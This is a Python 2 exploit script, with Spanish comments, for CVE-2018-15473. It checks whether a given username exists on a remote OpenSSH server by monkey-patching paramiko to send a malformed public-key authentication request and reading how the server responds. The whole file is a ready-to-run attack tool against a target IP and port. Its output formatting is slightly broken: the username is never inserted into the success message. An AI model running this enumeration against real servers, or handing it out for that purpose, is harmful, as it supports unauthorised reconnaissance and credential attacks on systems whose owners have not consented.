#!/usr/bin/env python
# Descubre en remoto usuario existente valido SSH
# CVE-2018-15473 SSH User Enumeration by hackingyseguridad.com (@hackyseguridad) https://hackingyseguridad.com.github.io

import argparse, logging, paramiko, socket, sys, os, warnings

if not sys.warnoptions:
    warnings.simplefilter("ignore")

class InvalidUsername(Exception):
    pass

def add_boolean(*args, **kwargs):
    pass

old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

def invalid_username(*args, **kwargs):
    raise InvalidUsername()

paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

def check_user(username):
    sock = socket.socket()
    sock.connect((args.target, int(args.port)))
    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print '[!] Failed to negotiate SSH transport'
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        print ""
        sys.exit(3)
    except paramiko.ssh_exception.AuthenticationException:
        print "" + args.target + ":" + args.port + " Existe este usuario !!!".format(username)

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', help="Set port of SSH service")
parser.add_argument('username', help="Username to check for validity.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

check_user(args.username)
